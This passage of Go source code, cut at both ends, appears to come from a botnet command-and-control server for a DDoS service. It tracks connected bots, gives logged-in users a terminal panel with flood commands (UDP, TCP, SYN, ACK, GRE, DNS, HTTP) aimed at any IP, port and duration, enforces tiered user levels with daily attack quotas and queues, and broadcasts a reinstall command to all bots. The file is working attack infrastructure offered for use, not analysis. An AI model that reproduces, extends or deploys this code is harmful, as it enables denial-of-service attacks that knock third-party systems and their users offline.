		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)
	certOut, _ := os.Create(cfg.CertFile)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()
	keyOut, _ := os.OpenFile(cfg.KeyFile, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func loadConfig() (*Config, error) {
	data, err := os.ReadFile("config.json")
	if err != nil {
		return nil, err
	}
	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}
	return &config, nil
}

func validateConfig() error {
	if cfg.MaxConns <= 0 || cfg.MaxReadSize <= 0 || cfg.MaxAttackDuration <= 0 {
		return fmt.Errorf("invalid config values")
	}
	if cfg.MinPasswordLength < 8 || cfg.ResetTokenValidity <= 0 {
		return fmt.Errorf("invalid security settings")
	}
	return nil
}

func initializeRootUser() {
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}

	rootExists := false
	for _, user := range users {
		if user.Username == "root" {
			rootExists = true
			break
		}
	}

	if !rootExists {
		password := randomString(16)
		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
		apiKey := randomString(64)
		rootUser := User{
			Username:      "root",
			PasswordHash:  string(hashedPassword),
			APIKey:        apiKey,
			Expire:        time.Now().AddDate(10, 0, 0),
			Level:         "Owner",
			CreatedAt:     time.Now(),
			WalletAddress: "", // Initialize empty or generate one
			Credits:       -1, // -1 could represent unlimited credits
			Transactions:  []Transaction{},
		}
		users = append(users, rootUser)
		saveUsers(users)

		logOutput("SYSTEM", fmt.Sprintf(`
        ┌──────────────────────────────────────────────┐
        │            ROOT USER CREATED                 │
        ├──────────────────────────────────────────────┤
        │ Username: root                               │
        │ Password: %-32s │
        │ API Key:  %-32s │
        └──────────────────────────────────────────────┘
        `, password, apiKey))
	}
}

func logOutput(source, message string) {
	logMutex.Lock()
	defer logMutex.Unlock()

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	colorCode := "37"

	switch source {
	case "SYSTEM":
		colorCode = "36"
	case "BOT":
		colorCode = "33"
	case "BOT_RAW":
		colorCode = "35"
	case "BOT_LOG":
		colorCode = "32"
	case "ATTACK":
		colorCode = "31"
	}

	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n", colorCode, timestamp, source, message)
}

func getTLSConfig() *tls.Config {
	cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	if err != nil {
		return nil
	}
	return &tls.Config{
		Certificates:     []tls.Certificate{cert},
		MinVersion:       tls.VersionTLS13,
		CipherSuites:     []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
	}
}

func getGeoLocation(ip string) (string, string, string, float64, float64, error) {
	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
		return "Local", "Local Network", "Internal", 0, 0, nil
	}
	host, _, _ := net.SplitHostPort(ip)
	ip = host
	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
	if err != nil {
		return "", "", "", 0, 0, err
	}
	defer resp.Body.Close()
	var data struct {
		Country   string  `json:"geoplugin_countryName"`
		City      string  `json:"geoplugin_city"`
		Region    string  `json:"geoplugin_regionName"`
		Latitude  float64 `json:"geoplugin_latitude,string"`
		Longitude float64 `json:"geoplugin_longitude,string"`
		Error     bool    `json:"error"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	if data.Error {
		return "", "", "", 0, 0, nil
	}
	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
}

func sendChallenge(conn net.Conn) (string, error) {
	challenge := randomString(16)
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
	return challenge, err
}

func verifyResponse(conn net.Conn, challenge string) (bool, error) {
	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	h := sha256.New()
	h.Write([]byte(challenge + "SALT"))
	expected := fmt.Sprintf("%x", h.Sum(nil))
	return strings.TrimSpace(response) == expected, nil
}

func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
				bots[i].RAM = ram
			}
			break
		}
	}
}

func updateBotHeartbeat(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	for i, b := range bots {
		if b.Conn == conn {
			bots[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}
	for i, botConn := range botConns {
		if botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return len(bots)
}

func incrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
}

func getUsers() []User {
	data, _ := os.ReadFile(cfg.UsersFile)
	var users []User
	json.Unmarshal(data, &users)
	return users
}

func saveUsers(users []User) error {
	data, _ := json.MarshalIndent(users, "", "  ")
	return os.WriteFile(cfg.UsersFile, data, 0600)
}

func setupFirewallRules() error {
	if !cfg.DDOSProtection {
		return nil
	}
	cmds := []string{
		"iptables -N ANTIDDOS",
		"iptables -A ANTIDDOS -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp --syn -j DROP",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -j DROP",
		"iptables -A ANTIDDOS -p udp -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p udp -j DROP",
		"iptables -I INPUT -j ANTIDDOS",
	}
	for _, cmd := range cmds {
		if err := exec.Command("sh", "-c", cmd).Run(); err != nil {
			return fmt.Errorf("failed to set iptables rule: %v", err)
		}
	}
	return nil
}

func cleanSessions() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		sessionStore.Range(func(key, value interface{}) bool {
			sess := value.(*session)
			if now.Sub(sess.lastActive) > cfg.SessionTimeout || now.After(sess.expires) {
				if keyStr, ok := key.(string); ok {
					sessionStore.Delete(keyStr)
				}
				userSessionLock.Lock()
				userSessions[sess.client.user.Username]--
				userSessionLock.Unlock()
			}
			return true
		})
	}
}

func cleanRateLimiters() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		limiterMutex.Lock()
		now := time.Now()
		for ip, limiter := range ipLimiterMap {
			if now.Sub(limiter.lastSeen) > 5*time.Minute {
				delete(ipLimiterMap, ip)
			}
		}
		for user, limiter := range userLimiterMap {
			if now.Sub(limiter.lastSeen) > 5*time.Minute {
				delete(userLimiterMap, user)
			}
		}
		limiterMutex.Unlock()
	}
}

func cleanBlockedIPs() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		blockedIPsLock.Lock()
		for ip, blockTime := range blockedIPs {
			if time.Since(blockTime) > 24*time.Hour {
				delete(blockedIPs, ip)
			}
		}
		blockedIPsLock.Unlock()
	}
}

func rotateLogs() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		if info, err := os.Stat(cfg.AuditLogFile); err == nil && info.Size() > cfg.MaxLogSize {
			if err := os.Remove(cfg.AuditLogFile + ".old"); err == nil || os.IsNotExist(err) {
				os.Rename(cfg.AuditLogFile, cfg.AuditLogFile+".old")
			}
		}
	}
}

func updateTitle() {
	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
	spinIndex := 0
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		attackCount := attackManagerInstance.countAttacks()
		botCount := getBotCount()
		uptime := time.Since(serverStartTime).Round(time.Second)

		for _, c := range clients {
			spinChar := spinChars[spinIndex]
			title := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
				spinChar, spinChar, c.user.Username, spinChar, botCount, spinChar,
				attackCount, attackManagerInstance.getMaxAttacks(), spinChar, uptime, spinChar, spinChar)
			c.conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title)))
		}
		spinIndex = (spinIndex + 1) % len(spinChars)
	}
}

func logSystemStats() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		stats := fmt.Sprintf("System stats - Load: %.2f, RAM: %.2fGB, Uptime: %.2fh, Cores: %d",
			getSystemLoad(),
			getSystemRAM(),
			getUptime()/3600,
			getCPUCount())
		logAuditEvent("SYSTEM", "STATS", stats)
	}
}

func getSystemRAM() float64 {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseFloat(fields[1], 64)
				return kb / 1024 / 1024
			}
		}
	}
	return 0
}

func getSystemLoad() float64 {
	data, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(data))
	load, _ := strconv.ParseFloat(fields[0], 64)
	return load
}

func getUptime() float64 {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(data))
	uptime, _ := strconv.ParseFloat(fields[0], 64)
	return uptime
}

func getCPUCount() int {
	return runtime.NumCPU()
}

func logAuditEvent(user, event, details string) {
	logEntry := fmt.Sprintf("[%s] %s: %s - %s",
		time.Now().Format("2006-01-02 15:04:05"),
		user,
		event,
		details)
	fmt.Println(logEntry)

	file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err == nil {
		fmt.Fprintln(file, logEntry)
		file.Close()
	}
}

func handleRequest(conn net.Conn) {
	reader := bufio.NewReader(conn)
	conn.Write([]byte("\033]0;Authentication Required\007"))
	readString, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	readString = strings.TrimSpace(readString)
	if strings.HasPrefix(readString, "PONG") {
		handleBotPong(conn, readString)
		return
	}
	if strings.HasPrefix(readString, "loginforme") {
		if authed, client := authUser(conn); authed {
			handleClientSession(conn, client)
		}
	}
}

func handleClientSession(conn net.Conn, c *client) {
	defer func() {
		userSessionLock.Lock()
		userSessions[c.user.Username]--
		userSessionLock.Unlock()
		sessionStore.Delete(c.sessionID)
		c.cancel()
		conn.Close()
	}()

	reader := bufio.NewReader(conn)
	for {
		conn.Write([]byte(getPrompt(c.user.GetLevel())))

		input, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		if len(parts) < 1 {
			continue
		}

		ipLimiter := getIPLimiter(c.remoteAddr)
		userLimiter := getUserLimiter(c.user.Username)
		if !ipLimiter.limiter.Allow() || !userLimiter.limiter.Allow() {
			conn.Write([]byte("Rate limit exceeded. Please wait...\n"))
			continue
		}

		if time.Since(c.lastCommand) < 2*time.Second {
			conn.Write([]byte("Command too fast. Please wait...\n"))
			continue
		}

		c.lastCommand = time.Now()
		command := strings.ToLower(parts[0])

		switch command {
		case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
			handleAttackCommand(conn, parts, c)
		case "ongoing":
			displayOngoingAttacks(conn)
		case "queue":
			displayQueuedAttacks(conn, c)
		case "cancel":
			handleCancelAttack(parts, c)
		case "bots", "bot":
			displayBotCount(conn)
		case "cls", "clear":
			conn.Write([]byte("\033[2J\033[H"))
		case "logout", "exit":
			return
		case "!reinstall":
			if c.user.GetLevel() <= 1 {
				sendToBots("!reinstall", c.user.Username)
			}
		case "help":
			displayHelp(conn, c.user.GetLevel())
		case "db":
			if c.user.GetLevel() <= 1 {
				displayUserDatabase(conn)
			}
		case "logs":
			if c.user.GetLevel() <= 1 {
				displayAuditLogs(conn)
			}
		case "adduser":
			if c.user.GetLevel() <= 1 {
				handleAddUser(parts)
			}
		case "deluser":
			if c.user.GetLevel() <= 1 {
				handleDeleteUser(parts)
			}
		case "resetpw":
			handleResetPassword(c, parts)
		case "?":
			displayQuickHelp(conn)
		case "status":
			displayServerStatus(conn)
		case "stop":
			attackManagerInstance.removeAttack(conn)
		case "stats":
			displayBotStats(conn)
		default:
			conn.Write([]byte("Unknown command. Type 'help' for available commands.\n"))
		}
	}
}

func (user *User) GetLevel() int {
	switch user.Level {
	case "Owner":
		return 0
	case "Admin":
		return 1
	case "Pro":
		return 2
	default:
		return 3
	}
}

func getPrompt(userLevel int) string {
	var levelName string
	var levelColor string
	switch userLevel {
	case 0:
		levelName = "OWNER"
		levelColor = "183"
	case 1:
		levelName = "ADMIN"
		levelColor = "251"
	case 2:
		levelName = "PRO"
		levelColor = "243"
	default:
		levelName = "BASIC"
		levelColor = "240"
	}
	return fmt.Sprintf("\n\r\033[38;5;240m[\033[38;5;237mPr\033[38;5;243mo\033[38;5;246mpt\033[38;5;240m]@[%s]\033[38;5;114m► \033[0m",
		colorizeText(levelName, levelColor))
}

func colorizeText(text, colorCode string) string {
	return fmt.Sprintf("\033[38;5;%sm%s\033[0m", colorCode, text)
}

func sendToBots(command, user string) {
	logAuditEvent(user, "COMMAND", fmt.Sprintf("Sent command to bots: %s", command))
	for _, botConn := range botConns {
		_, err := botConn.Write([]byte(command + "\r\n"))
		if err != nil {
			logOutput("BOT", fmt.Sprintf("Error sending to bot %s: %v", botConn.RemoteAddr(), err))
		}
	}
}

func removeClient(conn net.Conn) {
	for idx, c := range clients {
		if c.conn == conn {
			clients = append(clients[:idx], clients[idx+1:]...)
			break
		}
	}
}

func getIPLimiter(ip string) *rateLimiter {
	limiterMutex.Lock()
	defer limiterMutex.Unlock()
	if limiter, exists := ipLimiterMap[ip]; exists {
		limiter.lastSeen = time.Now()
		return limiter
	}
	newLimiter := &rateLimiter{limiter: rate.NewLimiter(rate.Every(200*time.Millisecond), 5), lastSeen: time.Now()}
	ipLimiterMap[ip] = newLimiter
	return newLimiter
}

func getUserLimiter(username string) *rateLimiter {
	limiterMutex.Lock()
	defer limiterMutex.Unlock()
	if limiter, exists := userLimiterMap[username]; exists {
		limiter.lastSeen = time.Now()
		return limiter
	}
	limit := rate.Every(1 * time.Second)
	burst := 10
	dailyAttacks := cfg.MaxDailyAttacks
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
		for _, user := range users {
			if user.Username == username {
				switch user.Level {
				case "Owner":
					limit = rate.Every(500 * time.Millisecond)
					burst = 20
					dailyAttacks = cfg.MaxDailyAttacks * 3
				case "Admin":
					limit = rate.Every(750 * time.Millisecond)
					burst = 15
					dailyAttacks = cfg.MaxDailyAttacks * 2
				}
				break
			}
		}
	}
	newLimiter := &rateLimiter{
		limiter:      rate.NewLimiter(limit, burst),
		lastSeen:     time.Now(),
		attacksToday: 0,
		lastReset:    time.Now(),
		dailyLimit:   dailyAttacks,
	}
	userLimiterMap[username] = newLimiter
	return newLimiter
}

func (rl *rateLimiter) canAttack() bool {
	if time.Now().Day() != rl.lastReset.Day() {
		rl.attacksToday = 0
		rl.lastReset = time.Now()
	}
	return rl.attacksToday < rl.dailyLimit
}

func getAggregatedStats() AggregatedStats {
	botStatsLock.Lock()
	defer botStatsLock.Unlock()
	var stats AggregatedStats
	count := 0
	for _, s := range botPerformance {
		stats.AvgLatency += s.Latency
		stats.AvgThroughput += s.Throughput
		stats.TotalRAM += s.RAM
		stats.TotalCores += s.Cores
		count++
	}
	if count > 0 {
		stats.AvgLatency /= time.Duration(count)
		stats.AvgThroughput /= float64(count)
	}
	stats.HealthyBots = count
	stats.UnhealthyBots = getBotCount() - count
	return stats
}

func handleBotPong(conn net.Conn, readString string) {
	remoteAddr := conn.RemoteAddr().(*net.TCPAddr).IP.String()
	parts := strings.Split(readString, ":")
	if len(parts) < 3 {
		return
	}
	botArch, _ := hex.DecodeString(parts[1])
	statsData, _ := hex.DecodeString(parts[2])
	statParts := strings.Split(string(statsData), "|")
	if len(statParts) < 4 {
		return
	}
	latencySec, _ := strconv.ParseFloat(statParts[0], 64)
	latency := time.Duration(latencySec * float64(time.Second))
	throughput, _ := strconv.ParseFloat(statParts[1], 64)
	ram, _ := strconv.ParseFloat(statParts[2], 64)
	cores, _ := strconv.Atoi(statParts[3])
	botStatsLock.Lock()
	botPerformance[remoteAddr] = BotStats{
		LastSeen:     time.Now(),
		Latency:      latency,
		Throughput:   throughput,
		RAM:          ram,
		Cores:        cores,
		Architecture: string(botArch),
	}
	botStatsLock.Unlock()
}

func handleAttackCommand(conn net.Conn, parts []string, c *client) {
	if c.user.GetLevel() > 2 {
		allowed := map[string]bool{"!udpflood": true, "!tcpflood": true}
		if !allowed[parts[0]] {
			return
		}
	}
	if len(parts) < 4 {
		return
	}
	method := parts[0]
	ip := parts[1]
	port := parts[2]
	duration := parts[3]
	if !allowedMethods[method] {
		return
	}
	if !validateIP(ip) {
		return
	}
	if !validatePort(port) {
		return
	}
	if !validateDuration(duration) {
		return
	}
	dur, _ := time.ParseDuration(duration + "s")
	userLimiter := getUserLimiter(c.user.Username)
	if !userLimiter.canAttack() {
		return
	}
	userLimiter.attacksToday++
	displayAttackLaunch(conn, method, ip, port, duration)
	logAuditEvent(c.user.Username, "ATTACK", fmt.Sprintf("Launched %s attack on %s:%s for %s seconds", method, ip, port, duration))
	priority := 0
	switch c.user.GetLevel() {
	case 0:
		priority = 3
	case 1:
		priority = 2
	case 2:
		priority = 1
	}
	attack := Attack{
		Method:    method,
		Target:    ip,
		Port:      port,
		Duration:  dur,
		Start:     time.Now(),
		User:      c.user.Username,
		Conn:      conn,
		QueueTime: time.Now(),
		Priority:  priority,
		Signature: signCommand(fmt.Sprintf("%s %s %s %d", method, ip, port, int(dur.Seconds()))),
	}
	attackManagerInstance.mutex.Lock()
	defer attackManagerInstance.mutex.Unlock()
	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
		if len(attackManagerInstance.attackQueue) >= cfg.MaxQueuedAttacks {
			return
		}
		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
		return
	}
	launchAttack(conn, attack)
}

func displayQueuedAttacks(conn net.Conn, c *client) {
	attacks := attackManagerInstance.getUserQueuedAttacks(c.user.Username)
	if len(attacks) == 0 {
		return
	}
	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := "\033[38;5;240sm|\033[38;5;251sm    QUEUED ATTACKS    \033[0m\n\r"
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;240sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
		"ID", "Method", "Target", "Port", "Duration", "Queued For")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for idx, attack := range attacks {
		row := fmt.Sprintf("\033[38;5;243sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
			idx+1,
			attack.Method,
			attack.Target,
			attack.Port,
			int(attack.Duration.Seconds()),
			time.Since(attack.QueueTime).Round(time.Second))
		conn.Write([]byte(row))
	}
	conn.Write([]byte(border))
}

func handleCancelAttack(parts []string, c *client) {
	if len(parts) < 2 {
		return
	}
	index, _ := strconv.Atoi(parts[1])
	if index < 1 {
		return
	}
	if attackManagerInstance.cancelQueuedAttack(c.user.Username, index-1) {
	} else {
	}
}

func animateText(conn net.Conn, text string, delay time.Duration, color string) {
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm", color)))
	for idx := 0; idx < len(text); idx++ {
		conn.Write([]byte(string(text[idx])))
		time.Sleep(delay)
		if idx%10 == 0 {
			if f, ok := conn.(interface{ Flush() error }); ok {
				f.Flush()
			}
		}
	}
	conn.Write([]byte("\033[0m\r\n"))
	if f, ok := conn.(interface{ Flush() error }); ok {
		f.Flush()
	}
}

func displayAttackLaunch(conn net.Conn, method, ip, port, duration string) {
	conn.Write([]byte("\033[2J\033[H"))
	now := time.Now().Format("15:04:05")
	animateText(conn, fmt.Sprintf("[%s] ATTACK LAUNCHED", now), 10*time.Millisecond, "45")
	conn.Write([]byte("\r\n\r\n"))

	details := []struct {
		label string
		value string
		color string
	}{
		{"Method:", method, "51"},
		{"Target:", fmt.Sprintf("%s:%s", ip, port), "118"},
		{"Duration:", fmt.Sprintf("%s seconds", duration), "197"},
		{"Bots:", fmt.Sprintf("%d", getBotCount()), "214"},
		{"Status:", "SENT TO BOTS", "46"},
	}

	maxLabelLen := 0
	for _, d := range details {
		if len(d.label) > maxLabelLen {
			maxLabelLen = len(d.label)
		}
	}

	for _, detail := range details {
		padding := strings.Repeat(" ", maxLabelLen-len(detail.label))
		line := fmt.Sprintf("  %s%s %s", detail.label, padding, detail.value)
		animateText(conn, line, 5*time.Millisecond, detail.color)
	}

	conn.Write([]byte("\r\n"))
	animateText(conn, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 5*time.Millisecond, "240")
	conn.Write([]byte("\r\n\r\n"))
	conn.Write([]byte("\033[2K\r"))
}

func displayOngoingAttacks(conn net.Conn) {
	attacks := attackManagerInstance.getAttacks()
	if len(attacks) == 0 {
		return
	}
	conn.Write([]byte("\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := "\033[38;5;240sm|\033[38;5;251sm    ONGOING ATTACKS    \033[0m\n\r"
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;240sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
		"Method", "Target", "Port", "Duration", "Time Remaining", "User")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for _, attack := range attacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining > 0 {
			row := fmt.Sprintf("\033[38;5;243sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
				attack.Method,
				attack.Target,
				attack.Port,
				int(attack.Duration.Seconds()),
				remaining.Round(time.Second),
				attack.User)
			conn.Write([]byte(row))
		}
	}
	conn.Write([]byte(border))
}

func displayBotCount(conn net.Conn) {
	count := getBotCount()
	conn.Write([]byte("\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := "\033[38;5;240sm|\033[38;5;251sm    CONNECTED BOTS    \033[0m\n\r"
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	content := fmt.Sprintf("\033[38;5;240sm| Total bots online: \033[38;5;254sm%d\033[0m\n\r", count)
	conn.Write([]byte(content))
	conn.Write([]byte(border))
}

func displayHelp(conn net.Conn, userLevel int) {
	conn.Write([]byte("\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := "\033[38;5;240sm|\033[38;5;251sm    HELP    \033[0m\n\r"
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	commands := []struct {
		cmd  string
		desc string
	}{
		{"?", "See all the different attack methods"},
		{"![method]", "Start an attack (method ip port duration)"},
		{"queue", "View your queued attacks"},
		{"cancel", "Cancel a queued attack (cancel <ID>)"},
		{"stop", "Stop an ongoing attack"},
		{"bots/bot", "Display connected bots count"},
		{"help", "Display this help message"},
		{"!reinstall", "Send reinstall command to all bots"},
		{"ongoing", "See all Current running attacks"},
		{"status", "Show server status information"},
		{"stats", "View bot performance stats"},
	}
	for _, cmd := range commands {
		line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;254sm%-15s \033[38;5;251sm- %s\033[0m\n\r",
			cmd.cmd, cmd.desc)
		conn.Write([]byte(line))
	}
	if userLevel <= 1 {
		conn.Write([]byte(border))
		adminTitle := "\033[38;5;240sm|\033[38;5;183sm    ADMIN COMMANDS    \033[0m\n\r"
		conn.Write([]byte(adminTitle))
		conn.Write([]byte(border))
		adminCmds := []struct {
			cmd  string
			desc string
		}{
			{"db", "Fetch all user login info"},
			{"logs", "View system audit logs"},
			{"adduser", "Create a new user (adduser <username> <level>)"},
			{"deluser", "Delete a user (deluser <username>)"},
			{"resetpw", "Reset a user's password (resetpw <username>)"},
		}
		for _, cmd := range adminCmds {
			line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;183sm%-15s \033[38;5;183sm- %s\033[0m\n\r",
				cmd.cmd, cmd.desc)
			conn.Write([]byte(line))
		}
	}
	conn.Write([]byte(border))
}

func displayUserDatabase(conn net.Conn) {
	file, _ := os.Open(cfg.UsersFile)
	defer file.Close()
	data, _ := io.ReadAll(file)
	var users []User
	json.Unmarshal(data, &users)
	conn.Write([]byte("\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := "\033[38;5;240sm|\033[38;5;183sm    USER DATABASE    \033[0m\n\r"
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	headers := fmt.Sprintf("\033[38;5;240sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
		"Username", "Password", "Expiration", "Level", "Last Activity")
	conn.Write([]byte(headers))
	conn.Write([]byte(border))
	for _, user := range users {
		row := fmt.Sprintf("\033[38;5;243sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
			user.Username,
			"********",
			user.Expire.Format("2006-01-02"),
			user.Level,
			user.LastActivity.Format("2006-01-02 15:04"))
		conn.Write([]byte(row))
	}
	conn.Write([]byte(border))
}

func handleAddUser(parts []string) {
	if len(parts) < 3 {
		return
	}
	username := sanitizeInput(parts[1])
	level := strings.ToLower(parts[2])
	var validLevel string
	switch level {
	case "owner":
		validLevel = "Owner"
	case "admin":
		validLevel = "Admin"
	case "pro":
		validLevel = "Pro"
	case "basic":
		validLevel = "Basic"
	default:
		return
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	for _, user := range users {
		if user.Username == username {
			return
		}
	}
	password := randomString(12)
	apiKey := randomString(64)
	hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	newUser := User{
		Username:     username,
		PasswordHash: string(hashedPassword),
		APIKey:       apiKey,
		Expire:       time.Now().AddDate(1, 0, 0),
		Level:        validLevel,
		CreatedAt:    time.Now(),
		LastActivity: time.Now(),
	}
	users = append(users, newUser)
	saveUsers(users)
	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s created with level %s", username, validLevel))
}

func handleDeleteUser(parts []string) {
	if len(parts) < 2 {
		return
	}
	username := sanitizeInput(parts[1])
	if username == "root" {
		return
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	found := false
	for idx, user := range users {
		if user.Username == username {
			users = append(users[:idx], users[idx+1:]...)
			found = true
			break
		}
	}
	if !found {
		return
	}
	saveUsers(users)
	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s deleted", username))
}

func handleResetPassword(c *client, parts []string) {
	if len(parts) < 2 && c.user.GetLevel() > 1 {
		return
	}
	var username string
	if len(parts) >= 2 {
		if c.user.GetLevel() > 1 {
			return
		}
		username = sanitizeInput(parts[1])
	} else {
		username = c.user.Username
	}
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
	}
	var found bool
	for _, user := range users {
		if user.Username == username {
			found = true
			break
		}
	}
	if !found {
		return
	}
	token := randomString(32)
	expires := time.Now().Add(cfg.ResetTokenValidity)
	resetTokens.Lock()
	resetTokens.m[username] = resetToken{
		username: username,
		token:    token,
		expires:  expires,
		used:     false,
	}
	resetTokens.Unlock()
	logAuditEvent(c.user.Username, "PASSWORD", fmt.Sprintf("Generated reset token for %s", username))
}

func displayAuditLogs(conn net.Conn) {
	const maxLines = 20
	file, err := os.Open(cfg.AuditLogFile)
	if err != nil {
		return
	}
